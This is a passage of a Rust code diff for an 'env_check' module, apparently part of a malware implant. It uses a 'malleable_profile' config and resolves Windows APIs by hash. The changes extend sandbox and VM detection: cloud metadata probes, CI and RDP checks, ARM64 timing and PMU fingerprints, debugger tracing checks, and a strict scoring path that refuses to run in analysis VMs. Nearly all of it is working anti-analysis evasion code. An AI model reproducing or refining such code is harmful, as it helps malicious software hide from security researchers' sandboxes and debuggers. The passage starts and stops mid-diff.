+                    if n > 12
+                        && buf.starts_with(b"HTTP/1.")
+                        && &buf[9..12] == b"200"
+                    {
+                        // Validate body: reject HTML, accept any non-HTML
+                        // body (JSON metadata from these providers).
+                        if let Some(body_start) = buf[..n]
+                            .windows(4)
+                            .position(|w| w == b"\r\n\r\n")
+                            .map(|p| p + 4)
+                        {
+                            let body = &buf[body_start..n];
+                            if !body.starts_with(b"<")
+                                && !body.starts_with(b"<!")
+                                && !body.is_empty()
+                            {
+                                tracing::debug!(
+                                    "env_check: cloud instance detected via {}",
+                                    label
+                                );
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
         false
     }
 }
-
-/// Fetch cloud instance-id from IMDS, supporting IMDSv1 and IMDSv2.
 /// Returns `None` when IMDS is unavailable or the response is invalid.
 ///
 /// **macOS**: Always returns `None`, consistent with `is_cloud_instance` which
@@ -1492,63 +1918,139 @@ fn fetch_cloud_instance_id() -> Option<String> {
     if n == 0 {
         return None;
     }
-    parse_http_200_body(&buf, n)
+    if let Some(id) = parse_http_200_body(&buf, n) {
+        return Some(id);
+    }
+
+    // ── Azure IMDS instance-id ────────────────────────────────────────────
+    //
+    // Azure IMDS returns JSON via GET /metadata/instance?api-version=2021-02-01
+    // with Metadata: true header.  The vmId is in compute.vmId.
+    // We also support the dedicated endpoint:
+    //   GET /metadata/instance/compute/vmId?api-version=2021-02-01
+    if let Some(mut stream) = open_stream() {
+        let azure_req = b"GET /metadata/instance/compute/vmId?api-version=2021-02-01 HTTP/1.0\r\nHost: 169.254.169.254\r\nMetadata: true\r\n\r\n";
+        if stream.write_all(azure_req).is_ok() {
+            let mut buf = [0u8; 512];
+            if let Ok(n) = stream.read(&mut buf) {
+                if n > 0 {
+                    if let Some(id) = parse_http_200_body(&buf, n) {
+                        // Azure vmId is a GUID like "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+                        let id = id.trim().to_string();
+                        if id.contains('-') && id.len() >= 32 {
+                            return Some(id);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // ── GCP IMDS instance-id ──────────────────────────────────────────────
+    //
+    // GCP IMDS returns the numeric instance ID via:
+    //   GET /computeMetadata/v1/instance/id HTTP/1.0
+    //   Host: metadata.google.internal
+    //   Metadata-Flavor: Google
+    if let Some(mut stream) = open_stream() {
+        let gcp_req = b"GET /computeMetadata/v1/instance/id HTTP/1.0\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\n\r\n";
+        if stream.write_all(gcp_req).is_ok() {
+            let mut buf = [0u8; 512];
+            if let Ok(n) = stream.read(&mut buf) {
+                if n > 0 {
+                    if let Some(id) = parse_http_200_body(&buf, n) {
+                        // GCP instance IDs are numeric strings
+                        let id = id.trim().to_string();
+                        if !id.is_empty() && id.chars().all(|c| c.is_ascii_digit()) {
+                            return Some(id);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    None
 }
 
 fn cloud_instance_vm_refusal_bypassed() -> bool {
-    if !is_cloud_instance() {
-        return false;
-    }
-
+    // Load config early — needed for both the primary IMDS path and the
+    // fallback path (hypervisor + fallback IDs) when IMDS is firewalled.
     let cfg = match crate::config::load_config() {
         Ok(c) => c,
         Err(_) => return false,
     };
 
     let profile = &cfg.malleable_profile;
-    let expected = profile
-        .cloud_instance_id
-        .as_deref()
-        .map(str::trim)
-        .filter(|s| !s.is_empty())
-        .map(str::to_string);
 
-    let actual = match fetch_cloud_instance_id() {
-        Some(id) => id,
-        None => {
-            if profile.cloud_instance_allow_without_imds {
-                log::warn!(
-                    "env_check: IMDS reachable but instance-id unavailable; VM refusal bypassed via cloud_instance_allow_without_imds"
-                );
-                return true;
+    // Primary path: IMDS is reachable, try to fetch the instance-id.
+    if is_cloud_instance() {
+        let expected = profile
+            .cloud_instance_id
+            .as_deref()
+            .map(str::trim)
+            .filter(|s| !s.is_empty())
+            .map(str::to_string);
+
+        let actual = match fetch_cloud_instance_id() {
+            Some(id) => id,
+            None => {
+                if profile.cloud_instance_allow_without_imds {
+                    tracing::warn!(
+                        "env_check: IMDS reachable but instance-id unavailable; VM refusal bypassed via cloud_instance_allow_without_imds"
+                    );
+                    return true;
+                }
+
+                // IMDS reachable but no instance-id — fall through to
+                // the hypervisor-based fallback check below.
+                let fallback_count = profile
+                    .cloud_instance_fallback_ids
+                    .iter()
+                    .filter(|p| !p.trim().is_empty())
+                    .count();
+
+                if fallback_count > 0 && is_expected_hypervisor() {
+                    tracing::warn!(
+                        "env_check: IMDS instance-id unavailable; VM refusal bypassed via cloud_instance_fallback_ids ({fallback_count} configured) + expected cloud hypervisor"
+                    );
+                    return true;
+                }
+
+                return false;
             }
+        };
 
-            let fallback_count = profile
-                .cloud_instance_fallback_ids
-                .iter()
-                .filter(|p| !p.trim().is_empty())
-                .count();
-
-            if fallback_count > 0 && is_expected_hypervisor() {
-                log::warn!(
-                    "env_check: IMDS instance-id unavailable; VM refusal bypassed via cloud_instance_fallback_ids ({fallback_count} configured) + expected cloud hypervisor"
-                );
-                return true;
-            }
-
+        if expected.as_deref() == Some(actual.as_str()) {
+            tracing::info!(
+                "env_check: running on whitelisted cloud instance {}, VM refusal bypassed",
+                actual
+            );
+            return true;
+        } else {
             return false;
         }
-    };
-
-    if expected.as_deref() == Some(actual.as_str()) {
-        log::info!(
-            "env_check: running on whitelisted cloud instance {}, VM refusal bypassed",
-            actual
-        );
-        true
-    } else {
-        false
     }
+
+    // Fallback path: IMDS is unreachable (firewalled or not a cloud VM).
+    // If the operator has configured cloud_instance_fallback_ids and this
+    // host's hypervisor matches an expected cloud vendor, bypass VM refusal.
+    // This ensures hardened cloud VMs with IMDS firewalled are still
+    // correctly identified rather than misclassified as sandboxes.
+    let fallback_count = profile
+        .cloud_instance_fallback_ids
+        .iter()
+        .filter(|p| !p.trim().is_empty())
+        .count();
+
+    if fallback_count > 0 && is_expected_hypervisor() {
+        tracing::warn!(
+            "env_check: IMDS unreachable (firewalled or non-cloud); VM refusal bypassed via cloud_instance_fallback_ids ({fallback_count} configured) + expected cloud hypervisor"
+        );
+        return true;
+    }
+
+    false
 }
 
 /// Detect whether the current host should be classified as a VM using
@@ -1597,7 +2099,18 @@ pub fn get_ram_gb() -> u64 {
             0
         }
     }
-    #[cfg(not(any(target_os = "linux", windows)))]
+    #[cfg(target_os = "macos")]
+    {
+        // hw.memsize returns total physical memory in bytes.
+        std::process::Command::new("sysctl")
+            .args(["-n", "hw.memsize"])
+            .output()
+            .ok()
+            .and_then(|o| String::from_utf8_lossy(&o.stdout).trim().parse::<u64>().ok())
+            .map(|bytes| bytes / (1024 * 1024 * 1024))
+            .unwrap_or(0)
+    }
+    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
     {
         0
     }
@@ -1630,7 +2143,31 @@ pub fn get_uptime_secs() -> u64 {
         };
         unsafe { get_tick_count_64() / 1000 }
     }
-    #[cfg(not(any(target_os = "linux", windows)))]
+    #[cfg(target_os = "macos")]
+    {
+        // Use sysctl kern.boottime to compute uptime on macOS.
+        let output = std::process::Command::new("sysctl")
+            .args(["-n", "kern.boottime"])
+            .output()
+            .ok();
+        if let Some(o) = output {
+            let s = String::from_utf8_lossy(&o.stdout);
+            // kern.boottime output: " { sec = 1234567890, usec = 0 } Thu Jan  1 00:00:00 2009"
+            if let Some(sec_part) = s.split("sec =").nth(1) {
+                if let Some(sec_str) = sec_part.split(',').next() {
+                    if let Ok(boot_secs) = sec_str.trim().parse::<u64>() {
+                        let now_secs = std::time::SystemTime::now()
+                            .duration_since(std::time::UNIX_EPOCH)
+                            .unwrap_or_default()
+                            .as_secs();
+                        return now_secs.saturating_sub(boot_secs);
+                    }
+                }
+            }
+        }
+        0
+    }
+    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
     {
         0
     }
@@ -1651,11 +2188,243 @@ pub fn get_uptime_secs() -> u64 {
 /// - Add provider-specific names to
 ///   `malleable_profile.vm_detection_extra_hypervisor_names` so
 ///   `is_expected_hypervisor` recognizes the platform without code changes.
+
+/// Heuristic to avoid false-positive VM refusal on unrecognized cloud / VPS
+/// providers whose hypervisor is not in `is_expected_hypervisor()` and whose
+/// IMDS is unavailable.
+///
+/// The logic is intentionally conservative: every condition must hold.
+///
+/// | Signal                | Threshold | Rationale                                           |
+/// |-----------------------|-----------|------------------------------------------------------|
+/// | Physical RAM          | > 4 GiB   | Sandboxes rarely allocate > 4 GiB                   |
+/// | Uptime                | > 24 h    | Automated sandboxes are typically short-lived        |
+/// | Logical CPU count     | > 1       | Single-vCPU analysis VMs are extremely common        |
+///
+/// An adversary could spoof these, but the point is *not* to provide
+/// unbreakable VM evasion — the operator already set `refuse_in_vm = true`.
+/// The goal is to avoid *false positives* on legitimate niche cloud hosts
+/// where the hypervisor DMI strings are not in our built-in list and the
+/// operator has not yet added `vm_detection_extra_hypervisor_names`.
+fn is_likely_production_server() -> bool {
+    let ram_gb = get_ram_gb();
+    let uptime_secs = get_uptime_secs();
+    let cpu_count = get_logical_cpu_count();
+
+    let ram_ok = ram_gb > 4;
+    let uptime_ok = uptime_secs > 24 * 3600;
+    let cpu_ok = cpu_count > 1;
+
+    if ram_ok && uptime_ok && cpu_ok {
+        tracing::debug!(
+            "env_check: is_likely_production_server: RAM={} GiB, uptime={} h, CPUs={} — \
+             all production heuristics satisfied",
+            ram_gb,
+            uptime_secs / 3600,
+            cpu_count,
+        );
+        true
+    } else {
+        tracing::debug!(
+            "env_check: is_likely_production_server: RAM={} GiB ({}, uptime={} h ({}), \
+             CPUs={} ({}) — not all production heuristics satisfied",
+            ram_gb,
+            if ram_ok { "OK" } else { "low" },
+            uptime_secs / 3600,
+            if uptime_ok { "OK" } else { "short" },
+            cpu_count,
+            if cpu_ok { "OK" } else { "single" },
+        );
+        false
+    }
+}
+
+/// Returns the logical CPU count available to this process.
+fn get_logical_cpu_count() -> u32 {
+    #[cfg(any(target_os = "linux", target_os = "macos"))]
+    {
+        unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) as u32 }
+    }
+    #[cfg(windows)]
+    {
+        let get_sysinfo: win_resolve::FnGetSystemInfo = unsafe {
+            win_resolve::resolve_api(
+                pe_resolve::HASH_KERNEL32_DLL,
+                win_resolve::HASH_GETSYSTEMINFO,
+            )
+            .expect("GetSystemInfo not found")
+        };
+        let mut si = win_resolve::SystemInfo::default();
+        unsafe { get_sysinfo(&mut si) };
+        si.dw_number_of_processors
+    }
+    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
+    {
+        1
+    }
+}
+
+/// Detect whether the current environment is a VM or sandbox.
+///
+/// Uses the unified scoring pipeline with false-positive mitigations enabled:
+/// generic indicator weights (DMI, MAC prefix) are reduced when cloud context
+/// is uncertain, and the "likely legitimate server" threshold boost may
+/// suppress detection on long-lived VMs with ample RAM.
+///
+/// **Consumer caveat**: This lenient mode avoids false positives on niche
+/// cloud providers at the cost of reduced sensitivity.  Callers that need
+/// the stricter classification used by `enforce(refuse_in_vm = true)` — for
+/// example, pre-flight checks that should match the enforcement decision —
+/// should use [`detect_vm_strict`] instead.
 pub fn detect_vm() -> bool {
     // Delegate to the unified scoring pipeline.
     let indicators = collect_indicators();
     let (is_sandbox, _, _) = evaluate_sandbox_score(&indicators);
     is_sandbox
+}
+
+/// Detect whether the current environment is a VM or sandbox using strict
+/// (enforcement-equivalent) scoring.
+///
+/// This applies the same indicator reweighting that `enforce(refuse_in_vm =
+/// true)` uses: generic DMI and MAC indicators are restored to their full
+/// weights, and the base threshold (30) is used without the "likely
+/// legitimate server" boost or hypervisor-only suppression.
+///
+/// Use this when the caller needs to match the enforcement decision — for
+/// example, a pre-flight report or a secondary check before a sensitive
+/// operation.
+///
+/// Returns `(is_vm, total_strict_score, threshold)`.
+pub fn detect_vm_strict() -> (bool, u32, u32) {
+    let mut indicators = collect_indicators();
+    // Restore weights that were conservatively reduced to prevent false
+    // positives in informational mode.
+    for ind in indicators.iter_mut() {
+        if ind.source == "dmi" && ind.weight == 10 {
+            ind.weight = 25;
+        }
+        if ind.source == "mac" && ind.weight == 10 {
+            ind.weight = 20;
+        }
+    }
+    let strict_total: u32 = indicators.iter().map(|i| i.weight).sum();
+    // Apply the same production-server threshold boost used by enforce():
+    // when the host has production-server characteristics (high RAM, long
+    // uptime, multi-core) and the score is borderline (30–35 from ≤ 2
+    // weak indicators), raise the threshold to 40 to avoid false positives
+    // on loaded production VMs where only CPUID + timing anomaly fire.
+    let production_server = is_likely_production_server();
+    let num_indicators = indicators.len();
+    let is_borderline = strict_total >= 30 && strict_total <= 35 && num_indicators <= 2;
+    let strict_threshold: u32 = if production_server && is_borderline { 40 } else { 30 };
+    // A score of 0 means no indicators at all; that is safe to ignore.
+    let is_vm = strict_total > 0 && strict_total >= strict_threshold;
+    (is_vm, strict_total, strict_threshold)
+}
+
+// ── Headless / CI / RDP Environment Detection ──────────────────────────────
+//
+// Mouse movement and desktop richness checks produce false positives in
+// non-interactive environments (headless servers, CI runners, RDP sessions
+// without mouse activity).  These helpers detect such environments so the
+// scoring pipeline can reduce or zero-out the mouse/desktop weights.
+
+/// Detect common CI/CD runner environments by checking well-known environment
+/// variables.  Returns `true` if the current process is likely running inside
+/// a CI pipeline.
+///
+/// CI environments are inherently headless: they never have a human moving a
+/// mouse or interacting with a desktop.  Both mouse and desktop indicators
+/// should be zeroed when this returns `true`.
+fn is_ci_environment() -> bool {
+    // Single definitive CI variables (set by the CI system itself).
+    if std::env::var_os("CI").is_some() && std::env::var("CI").map(|v| v == "true").unwrap_or(false) {
+        return true;
+    }
+    // Platform-specific CI indicators.
+    const CI_VARS: &[&str] = &[
+        "GITHUB_ACTIONS",       // GitHub Actions
+        "GITLAB_CI",            // GitLab CI
+        "JENKINS_URL",          // Jenkins
+        "TRAVIS",               // Travis CI
+        "CIRCLECI",             // CircleCI
+        "BUILDKITE",            // Buildkite
+        "TF_BUILD",             // Azure Pipelines
+        "HEROKU_TEST_RUN_ID",   // Heroku CI
+        "BITBUCKET_BUILD_NUMBER", // Bitbucket Pipelines
+        "TEAMCITY_VERSION",     // TeamCity
+        "CODEBUILD_BUILD_ID",   // AWS CodeBuild
+    ];
+    for var in CI_VARS {
+        if std::env::var_os(var).is_some() {
+            return true;
+        }
+    }
+    false
+}
+
+/// Detect whether the current Windows session is an RDP (Terminal Services)
+/// client session.  On RDP sessions the mouse may not move if the user is
+/// only using keyboard or is connected but idle — the mouse check should
+/// be zeroed to avoid false positives.
+///
+/// Returns `false` on non-Windows platforms.
+#[cfg(windows)]
+fn is_rdp_session() -> bool {
+    let get_system_metrics: win_resolve::FnGetSystemMetrics = unsafe {
+        match win_resolve::resolve_api_or_load(
+            win_resolve::USER32_DLL_W,
+            win_resolve::HASH_USER32_DLL,
+            win_resolve::HASH_GETSYSTEMMETRICS,
+        ) {
+            Some(f) => f,
+            None => return false,
+        }
+    };
+    unsafe { get_system_metrics(win_resolve::SM_REMOTESESSION) != 0 }
+}
+
+#[cfg(not(windows))]
+fn is_rdp_session() -> bool {
+    false
+}
+
+/// Detect whether the current Windows process is running in a non-interactive
+/// (service) session.  Windows services run in Session 0 which has no desktop.
+///
+/// Returns `false` on non-Windows platforms.
+#[cfg(windows)]
+fn is_noninteractive_session() -> bool {
+    // Check if the process is in Session 0 (services session).
+    // Services run in Session 0 which has no interactive desktop.
+    let get_system_metrics: win_resolve::FnGetSystemMetrics = unsafe {
+        match win_resolve::resolve_api_or_load(
+            win_resolve::USER32_DLL_W,
+            win_resolve::HASH_USER32_DLL,
+            win_resolve::HASH_GETSYSTEMMETRICS,
+        ) {
+            Some(f) => f,
+            None => return false,
+        }
+    };
+    // SM_REMOTESESSION already checked separately; this checks if there's
+    // no user interactive session at all (headless server / service).
+    // A secondary heuristic: check SESSIONNAME env var.  Services typically
+    // have no SESSIONNAME or "Console" in Session 0.
+    if std::env::var_os("SESSIONNAME").is_none() {
+        // Could be a service.  Also check if we're in Session 0 via
+        // ProcessIdToSessionId.  If unavailable, rely on the registry
+        // InstallationType check (already done in sandbox module).
+        // For now, combine with the Server Core registry check.
+        return false; // Don't over-flag — the Server Core check handles this
+    }
+    false
+}
+
+#[cfg(not(windows))]
+fn is_noninteractive_session() -> bool {
+    false
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -1752,10 +2521,46 @@ pub fn collect_indicators() -> Vec<common::SandboxIndicator> {
     //   mouse=min(score*5,30), desktop=min(score*3,25),
     //   uptime=min(score*2,25), hardware=min(score,20)
     let metrics = sandbox::collect_raw_metrics();
-    let mouse_weight = std::cmp::min((metrics.mouse_movement_score as u32) * 5, 30);
-    let desktop_weight = std::cmp::min((metrics.desktop_richness_score as u32) * 3, 25);
+    let mut mouse_weight = std::cmp::min((metrics.mouse_movement_score as u32) * 5, 30);
+    let mut desktop_weight = std::cmp::min((metrics.desktop_richness_score as u32) * 3, 25);
     let uptime_weight = std::cmp::min((metrics.uptime_score as u32) * 2, 25);
     let hardware_weight = std::cmp::min(metrics.hardware_plausibility_score as u32, 20);
+
+    // ── 4a. Headless / CI / RDP false-positive mitigation ──────────────
+    //
+    // Mouse movement and desktop richness checks are unreliable in
+    // non-interactive environments:
+    //
+    //   • CI runners (GitHub Actions, GitLab CI, Jenkins, …) never have a
+    //     human at the console.  Both mouse AND desktop should be zeroed.
+    //
+    //   • RDP sessions: the remote user may be idle or using keyboard-only.
+    //     Mouse weight is zeroed; desktop weight is kept because the remote
+    //     session still has a window manager.
+    //
+    //   • Headless Linux/macOS: already handled by DISPLAY/CoreGraphics
+    //     checks inside the sandbox module (return 0).  The mitigations
+    //     below are additive to those per-OS checks.
+    let ci_env = is_ci_environment();
+    let rdp_session = is_rdp_session();
+
+    if ci_env {
+        // CI environments are headless by definition — zero both.
+        tracing::info!(
+            "env_check: CI environment detected (CI/GITHUB_ACTIONS/etc); zeroing mouse and desktop weights"
+        );
+        mouse_weight = 0;
+        desktop_weight = 0;
+    }
+    if rdp_session && mouse_weight > 0 {
+        // RDP sessions often have no mouse movement (user may be idle or
+        // keyboard-only).  Reduce mouse weight but keep desktop — the
+        // remote session still has a window manager with visible windows.
+        tracing::info!(
+            "env_check: RDP session detected (SM_REMOTESESSION); zeroing mouse weight (desktop kept)"
+        );
+        mouse_weight = 0;
+    }
 
     if mouse_weight > 0 {
         indicators.push(common::SandboxIndicator {
@@ -1840,16 +2645,29 @@ pub fn collect_indicators() -> Vec<common::SandboxIndicator> {
         });
     }
 
-    // ── 8. Hardware Performance Counter fingerprint (x86_64) ──────────
+    // ── 8. Hardware Performance Counter fingerprint ───────────────────
+    // x86_64: uses RDPMC to measure cache misses, branch prediction,
+    // instruction retirement, and micro-op ratio.
     #[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
     if let Some(hpc) = env_check_hpc::hpc_indicator() {
         indicators.push(hpc);
     }
+    // ARM64: uses PMCCNTR_EL0 (PMU cycle counter) when accessible.
+    #[cfg(target_arch = "aarch64")]
+    if let Some(pmu) = env_check_arm64_timer::pmu_indicator() {
+        indicators.push(pmu);
+    }
 
-    // ── 9. Instruction-granularity RDTSC timing (x86_64) ────────────────
+    // ── 9. Instruction-granularity timing ────────────────────────────────
+    // x86_64: uses RDTSC/RDTSCP with CPUID serialization.
     #[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
     if let Some(rdtsc) = env_check_rdtsc::instruction_timing_indicator() {
         indicators.push(rdtsc);
+    }
+    // ARM64: uses CNTVCT_EL0 with ISB serialization.
+    #[cfg(target_arch = "aarch64")]
+    if let Some(arm64_timer) = env_check_arm64_timer::instruction_timing_indicator() {
+        indicators.push(arm64_timer);
     }
 
     // ── 10. Hypervisor vendor string (CPUID 0x40000000) ──────────────────
@@ -1862,11 +2680,16 @@ pub fn collect_indicators() -> Vec<common::SandboxIndicator> {
         indicators.push(ind);
     }
 
-    // ── 11. Timing source consistency cross-check (Windows x86-64) ───────
-    // RDTSC, QPC, and GSTPAFT should all agree within 1-2% on real hardware.
-    // Sandboxes that manipulate time sources diverge by >10%.
+    // ── 11. Timing source consistency cross-check ───────────────────────
+    // Windows x86-64: compares RDTSC, QPC, and GSTPAFT.  All three should
+    // agree within 1-2% on real hardware.  Sandboxes diverge by >10%.
     #[cfg(all(windows, target_arch = "x86_64"))]
     if let Some(ind) = timing_consistency_indicator() {
+        indicators.push(ind);
+    }
+    // ARM64: compares CNTVCT_EL0 against std::time::Instant.
+    #[cfg(target_arch = "aarch64")]
+    if let Some(ind) = env_check_arm64_timer::timing_consistency_indicator() {
         indicators.push(ind);
     }
 
@@ -1946,8 +2769,11 @@ pub fn evaluate_sandbox_score(
             && matches!(
                 i.source.as_str(),
                 "cpuid" | "dmi" | "registry" | "mac" | "imds"
-                    | "cpuid_vendor"       // hypervisor vendor string
-                    | "rdtsc_consistency"  // timing source cross-check
+                    | "cpuid_vendor"              // hypervisor vendor string
+                    | "rdtsc_consistency"          // x86 timing source cross-check
+                    | "arm64_timer_consistency"    // ARM64 timing source cross-check
+                    | "arm64_timer"                // ARM64 instruction timing
+                    | "arm64_pmu"                  // ARM64 PMU fingerprint
                     | "lineage" // analysis-framework parent process
             )
     });
@@ -1988,7 +2814,7 @@ pub fn evaluate_sandbox_score(
     // environments. Require high-confidence heuristics (>=70) when there is
     // no VM artifact signal.
     let is_sandbox = if is_sandbox && !has_vm_artifact_signal && heuristic_weight < 70 {
-        log::info!(
+        tracing::info!(
             "env_check: suppressing medium heuristic-only VM classification \
              (heuristic_weight={heuristic_weight}, total_weight={total_weight}, threshold={threshold})"
         );
@@ -1997,23 +2823,22 @@ pub fn evaluate_sandbox_score(
         is_sandbox
     };
 
-    // Defence-in-depth: never flag based solely on the CPUID hypervisor bit.
-    let hypervisor_only = indicators.iter().any(|i| i.weight > 0)
-        && indicators.iter().filter(|i| i.weight > 0).count() == 1
-        && hypervisor_bit_set;
-
-    let is_sandbox = if hypervisor_only {
-        log::info!(
-            "env_check: hypervisor bit is the sole weighted indicator (total_weight={total_weight}, \
-             threshold={threshold}); suppressing VM detection to avoid false positive"
-        );
-        false
-    } else {
-        is_sandbox
-    };
+    // L-8 fix: removed blanket hypervisor-only suppression.  The CPUID
+    // hypervisor bit carries weight 15, which cannot exceed the minimum
+    // threshold of 30 on its own, so it cannot trigger a false positive.
+    // The previous suppression prevented the hypervisor bit from being
+    // reported in the score breakdown and from contributing to
+    // `has_vm_artifact_signal` corroboration, which caused false negatives
+    // on cloud-hosted sandboxes that pass IMDS checks.
+    //
+    // If the hypervisor bit is the sole indicator (total_weight == 15,
+    // threshold >= 30), `is_sandbox` is already false by the threshold
+    // check above — no suppression needed.  If any other indicator is
+    // present (e.g. timing anomaly at weight 15), the combined score of
+    // 30 now correctly reaches the threshold instead of being discarded.
 
     if is_sandbox && !cloud_imds && !cloud_hypervisor {
-        log::warn!(
+        tracing::warn!(
             "env_check: VM detected with threshold={threshold} and no cloud signal confirmed; \
              if this is a niche cloud deployment, verify IMDS connectivity and \
              extend is_expected_hypervisor via vm_detection_extra_hypervisor_names"
@@ -2346,7 +3171,7 @@ fn macos_system_profiler_indicates_vm() -> bool {
                 let _ = reader.join();
 
                 if timed_out {
-                    log::debug!(
+                    tracing::debug!(
                         "env_check: macOS ioreg -l timed out after 2s; returning no ioreg VM indicator"
                     );
                 } else if saw_qemu && !saw_docker_desktop {
@@ -2908,11 +3733,14 @@ fn is_tracer_process_running() -> bool {
     // Primary check: TracerPid in our own status — fast and reliable.
     if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
         for line in status.lines() {
-            if line.starts_with("TracerPid:") {
-                let pid = line.trim_start_matches("TracerPid:").trim();
-                // A TracerPid other than 0 means we are actively being traced.
-                if pid != "0" {
-                    return true;
+            // L-4: Use whitespace-split to handle tab-delimited and unusual
+            // /proc/self/status formats (custom kernels, container procfs).
+            let mut parts = line.split_whitespace();
+            if parts.next().map_or(false, |k| k == "TracerPid:") {
+                if let Some(val) = parts.next() {
+                    if val != "0" {
+                        return true;
+                    }
                 }
             }
         }
@@ -2942,7 +3770,7 @@ fn is_tracer_process_running() -> bool {
 
             scanned += 1;
             if scanned > 200 {
-                log::debug!("env_check: /proc tracer scan reached 200-process limit; stopping");
+                tracing::debug!("env_check: /proc tracer scan reached 200-process limit; stopping");
                 break;
             }
 
@@ -3160,32 +3988,80 @@ fn current_domain() -> Option<String> {
                 return Some(s.to_string());
             }
         }
-        if let Ok(s) = std::fs::read_to_string("/etc/resolv.conf") {
-            // `domain` takes priority; `search` is accepted as a fallback because
-            // many managed Linux hosts (cloud-init, corporate DHCP) only set
-            // `search` and omit the `domain` directive entirely.
-            let mut search_fallback: Option<String> = None;
-            for line in s.lines() {
-                if let Some(rest) = line.strip_prefix("domain ") {
-                    // `domain` is definitive — return immediately.
-                    return Some(rest.trim().to_string());
-                }
-                if search_fallback.is_none() {
-                    if let Some(rest) = line.strip_prefix("search ") {
-                        // `search` may list multiple domains separated by whitespace;
-                        // take the first one (the most specific, per resolv.conf(5)).
-                        if let Some(first) = rest.split_whitespace().next() {
-                            search_fallback = Some(first.to_string());
-                        }
-                    }
-                }
+        if let Some(d) = domain_from_resolv_conf() {
+            return Some(d);
+        }
+    }
+    #[cfg(target_os = "macos")]
+    {
+        // macOS does not set USERDNSDOMAIN (that is a Windows env var).
+        // Use /etc/resolv.conf (present on all macOS systems) and fall back
+        // to the Bonjour / local hostname returned by `scutil --get
+        // ComputerName` for non-domain-joined hosts.
+        if let Some(d) = domain_from_resolv_conf() {
+            return Some(d);
+        }
+        // dsconfigad -show can confirm Active Directory binding, but
+        // spawning an external process is noisy.  Prefer /etc/resolv.conf.
+    }
+    None
+}
+
+/// Read `/etc/resolv.conf` and extract the `domain` or `search` directive.
+///
+/// Shared by the Linux and macOS domain-detection paths.
+#[cfg(any(target_os = "linux", target_os = "macos"))]
+fn domain_from_resolv_conf() -> Option<String> {
+    let s = std::fs::read_to_string("/etc/resolv.conf").ok()?;
+    domain_from_resolv_conf_content(&s)
+}
+
+/// Parse domain/search directives from resolv.conf content.
+///
+/// Visible for testing so callers can supply synthetic content without
+/// touching the filesystem.
+fn domain_from_resolv_conf_content(s: &str) -> Option<String> {
+    // `domain` takes priority; `search` is accepted as a fallback because
+    // many managed hosts (cloud-init, corporate DHCP) only set `search`
+    // and omit the `domain` directive entirely.
+    //
+    // Parsing rules (per resolv.conf(5)):
+    //   • Leading whitespace (spaces, tabs) before the directive is accepted
+    //     by glibc and musl and must not cause a false negative.
+    //   • Lines starting with '#' or ';' after trimming are comments.
+    //   • Empty lines are skipped.
+    //   • L-5: The separator between the keyword and value may be spaces
+    //     OR tabs — use whitespace-split instead of strip_prefix to handle
+    //     tab-delimited entries (e.g. `domain\tcorp.example.com` from
+    //     systemd-resolved or unusual DHCP clients).
+    let mut search_fallback: Option<String> = None;
+    for raw_line in s.lines() {
+        let line = raw_line.trim();
+        // Skip empty lines and comments.
+        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
+            continue;
+        }
+        let mut parts = line.splitn(2, char::is_whitespace);
+        let keyword = match parts.next() {
+            Some(k) => k,
+            None => continue,
+        };
+        let value = parts.next().unwrap_or("").trim();
+        if keyword == "domain" {
+            // `domain` is definitive — return immediately.
+            if !value.is_empty() {
+                return Some(value.to_string());
             }
-            if let Some(sd) = search_fallback {
-                return Some(sd);
+        }
+        if search_fallback.is_none() && keyword == "search" {
+            // `search` may list multiple domains separated by whitespace;
+            // take the first one (the most specific, per resolv.conf(5)).
+            if let Some(first) = value.split_whitespace().next() {
+                search_fallback = Some(first.to_string());
             }
         }
     }
-    None
+    search_fallback
 }
 
 #[cfg(windows)]
@@ -3274,9 +4150,76 @@ pub fn enforce(
     refuse_in_vm: bool,
     sandbox_score_threshold: Option<u32>,
 ) -> EnvDecision {
-    let report = EnvReport::collect(required_domain);
+    let mut report = EnvReport::collect(required_domain);
+
+    // When the operator explicitly sets `refuse_in_vm = true`, the default
+    // false-positive mitigations (cloud-uncertainty weight reductions, the
+    // "likely legitimate server" threshold boost, and the hypervisor-only
+    // suppression) must not silently swallow a VM signal.  Re-evaluate with
+    // full indicator weights and the base threshold (30) so that e.g.
+    // CPUID(15) + DMI(25) + MAC(20) = 60 >= 30 correctly fires even when
+    // normal detection was suppressed.
+    if refuse_in_vm && !report.vm_detected {
+        let mut strict_indicators = collect_indicators();
+        // Restore weights that were conservatively reduced to prevent false
+        // positives in informational mode.  In strict (refuse_in_vm) mode the
+        // operator's intent is unambiguous.
+        for ind in strict_indicators.iter_mut() {
+            if ind.source == "dmi" && ind.weight == 10 {
+                ind.weight = 25;
+            }
+            if ind.source == "mac" && ind.weight == 10 {
+                ind.weight = 20;
+            }
+        }
+        let strict_total: u32 = strict_indicators.iter().map(|i| i.weight).sum();
+        // Use base threshold 30, but raise to 40 on production servers when
+        // the evidence is only borderline.  This prevents false positives on
+        // loaded production VMs where the only indicators are the hypervisor
+        // CPUID bit (15) and a transient timing anomaly (15) — neither of
+        // which is conclusive on its own.  A production server with strong
+        // evidence (DMI=25 or MAC=20 alongside the CPUID bit) will still
+        // score ≥ 40 and be correctly flagged.
+        let production_server = is_likely_production_server();
+        let num_indicators = strict_indicators.len();
+        // The "borderline" zone is exactly the base threshold with at most 2
+        // weak indicators: anything above 30 has at least one strong indicator
+        // and should not be suppressed.
+        let is_borderline = strict_total >= 30 && strict_total <= 35 && num_indicators <= 2;
+        let strict_threshold: u32 = if production_server && is_borderline {
+            tracing::info!(
+                "env_check: raising strict VM threshold 30→40 on production-server host \
+                 (strict_total={strict_total}, {num_indicators} indicator(s)); borderline \
+                 score from weak indicators alone is insufficient"
+            );
+            40
+        } else {
+            30
+        };
+        if strict_total >= strict_threshold {
+            tracing::info!(
